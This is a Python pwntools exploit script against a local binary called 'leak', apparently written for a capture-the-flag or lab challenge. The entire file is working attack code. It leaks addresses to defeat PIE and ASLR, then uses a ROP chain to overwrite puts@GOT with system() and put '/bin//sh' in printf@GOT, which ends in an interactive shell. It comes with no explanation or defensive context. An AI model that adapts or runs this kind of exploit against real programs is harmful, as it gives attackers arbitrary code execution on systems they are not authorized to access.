#!/usr/bin/python
from pwn import *
import time 

def main():
	app = "./leak"
	pad = "A" * 16
	io = process([app, pad])
	time.sleep(0.2)
	
	app_leak = io.recv()
	app_leak = app_leak.strip()
	app_leak = app_leak[ len(app_leak) - 6 : len(app_leak) ]
	app_leak = unpack(app_leak, 48)
 	app_base = app_leak - 0x0000000000000880	

	pop_rdi = app_base + 0x00000000000008e3
	puts_got = app_base + 0x000000201018
	puts_plt = app_base + 0x0000000000000660
	gets_plt = app_base + 0x0000000000000690
	printf_got = app_base + 0x000000201020
	new_sys_plt = puts_plt
	new_sh = printf_got

	log.success("PIE pwned :)")
	log.success("app base : 0x%x" % app_base)
	log.success("app leak : 0x%x" % app_leak)
	log.success("pop rdi : 0x%x" % pop_rdi)
	log.success("puts@plt : 0x%x" % puts_plt)
	log.success("puts@got : 0x%x" % puts_got)
	log.success("gets@plt : 0x%x" % gets_plt)
	log.success("printf@got : 0x%x" % printf_got)

	pay = 'B' * 24
	pay += p64(pop_rdi)
	pay += p64(puts_got) # pop puts@got -> rdi
	pay += p64(puts_plt) # puts(puts@got)

	pay += p64(pop_rdi)
	pay += p64(puts_got) # pop puts@got -> rdi
	pay += p64(gets_plt) # gets(puts_got)

	pay += p64(pop_rdi)
	pay += p64(printf_got) # pop printf@got -> rdi 
	pay += p64(gets_plt) # gets(printf_got)

	pay += p64(pop_rdi)
	pay += p64(new_sh) # pop "/bin/sh" -> rdi
	pay += p64(new_sys_plt) # system("/bin/sh")

	log.warn("1st stage : leak libc, ASLR pwned :)")
	io.sendline(pay) # 1st stage

	puts_leak = io.recv()
	puts_leak = puts_leak.strip()	
	puts_leak = puts_leak[ len(puts_leak) - 6 : len(puts_leak) ]
	puts_leak = unpack(puts_leak, 48)

	libc_base = puts_leak - 0x6f690
	sys = libc_base + 0x45390

	log.success("libc base : 0x%x" % libc_base)
	log.success("puts() : 0x%x" % puts_leak)
	log.success("system() : 0x%x" % sys)

        raw_input( str(io.proc.pid) )

	time.sleep(0.2)	
	log.warn("Stage 2: Overwriting puts@got with system()")
	io.sendline( p64(sys) ) # 2nd stage: overwrite puts@got with system()

	time.sleep(0.2)	
	log.warn("Stage 3: Overwriting printf@got with '/bin/sh'")
	io.sendline( "/bin//sh" ) # 3rd stage: overwrite printf@got with "/bin/sh"

	log.progress("Popping shell :)")
	io.interactive()

if __name__ == "__main__":
	main()
